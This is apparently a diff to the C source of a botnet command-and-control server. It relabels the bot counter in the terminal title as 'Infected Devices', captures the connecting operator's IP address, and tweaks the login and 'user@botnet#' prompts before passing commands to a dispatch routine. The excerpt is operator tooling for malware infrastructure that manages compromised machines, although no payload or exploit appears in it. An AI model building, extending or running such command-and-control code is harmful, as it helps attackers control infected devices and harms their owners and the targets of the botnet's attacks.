@@ -24,20 +24,26 @@ void* update_title(void* arg) {
         pthread_mutex_unlock(&bot_mutex);
 
         char buffer[15000];
-        sprintf(buffer, "\0337\033]0;Bots Loaded: %d\007\0338", valid_bots);
+        sprintf(buffer, "\0337\033]0;Infected Devices: %d\007\0338", valid_bots);
         if (client_socket > 0) {
             send(client_socket, buffer, strlen(buffer), 0);
         }
 
         sleep(2);
     }
-
+    
     return NULL;
 }
 
 void* handle_client(void* arg) {
     int client_socket = *((int*)arg);
     free(arg);
+
+    struct sockaddr_in addr;
+    socklen_t addr_len = sizeof(addr);
+    getpeername(client_socket, (struct sockaddr*)&addr, &addr_len);
+    char user_ip[INET_ADDRSTRLEN];
+    inet_ntop(AF_INET, &addr.sin_addr, user_ip, sizeof(user_ip));
 
     char buffer[4096];
     sprintf(buffer, "\r" YELLOW "\rLogin: " RESET);
@@ -67,7 +73,7 @@ void* handle_client(void* arg) {
     }
 
     while (user_index == -2) {
-        sprintf(buffer, "\r" YELLOW "\rUser connected already, Disconnect? Y/N:\r " RESET);
+        sprintf(buffer, "\r" YELLOW "User connected already, Disconnect? Y/N: " RESET);
         send(client_socket, buffer, strlen(buffer), 0);
 
         char response[2];
@@ -108,7 +114,7 @@ void* handle_client(void* arg) {
         char command[MAX_COMMAND_LENGTH];
         while (1) {
             char prompt[MAX_COMMAND_LENGTH];
-            sprintf(prompt, RED "%s@botnet# " RESET, user->user);
+            sprintf(prompt, RED "\r%s@botnet#" RESET, user->user);
             sprintf(buffer, "\r%s", prompt);
             send(client_socket, buffer, strlen(buffer), 0);
 
@@ -129,9 +135,8 @@ void* handle_client(void* arg) {
             sprintf(buffer, "\r\n");
             send(client_socket, buffer, strlen(buffer), 0);
 
-            process_command(user, command, client_socket);
-        }
+            process_command(user, command, client_socket, user_ip);
+               }
     }
-
     return NULL;
 }
